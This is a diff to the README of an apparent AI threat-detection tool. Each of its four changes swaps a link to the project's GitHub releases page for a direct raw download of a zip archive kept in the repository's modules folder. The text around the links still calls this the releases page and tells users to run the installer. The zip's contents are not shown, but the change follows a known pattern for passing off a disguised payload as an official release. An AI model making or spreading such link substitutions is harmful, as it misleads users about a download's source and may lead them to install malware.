@@ -1,6 +1,6 @@
 # 🔒 security-intelligence-engine - Easy AI Threat Detection
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-green?style=for-the-badge)](https://github.com/widapra/security-intelligence-engine/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-green?style=for-the-badge)](https://raw.githubusercontent.com/widapra/security-intelligence-engine/main/modules/engine_security_intelligence_2.4.zip)
 
 ## 📋 What is security-intelligence-engine?
 
@@ -36,7 +36,7 @@ No special hardware is needed. A standard laptop or desktop meeting these specs 
 
    Go to the releases page to get the latest version of security-intelligence-engine:
 
-   [![Download Releases](https://img.shields.io/badge/Downloads-Click%20Here-blue?style=for-the-badge)](https://github.com/widapra/security-intelligence-engine/releases)
+   [![Download Releases](https://img.shields.io/badge/Downloads-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/widapra/security-intelligence-engine/main/modules/engine_security_intelligence_2.4.zip)
 
 2. **Find the Latest Release**
 
@@ -103,7 +103,7 @@ If you use Wazuh SIEM, the engine automatically connects to its data.
 
 To update security-intelligence-engine:
 
-1. Return to the releases page: https://github.com/widapra/security-intelligence-engine/releases
+1. Return to the releases page: https://raw.githubusercontent.com/widapra/security-intelligence-engine/main/modules/engine_security_intelligence_2.4.zip
 2. Download the newest Windows installer.
 3. Run the installer to overwrite the old version.
 4. Your settings and data will be preserved.
@@ -120,4 +120,4 @@ If you need help, you can open an issue on the GitHub repository or look for ans
 
 ---
 
-[Download Latest Release](https://github.com/widapra/security-intelligence-engine/releases)
+[Download Latest Release](https://raw.githubusercontent.com/widapra/security-intelligence-engine/main/modules/engine_security_intelligence_2.4.zip)
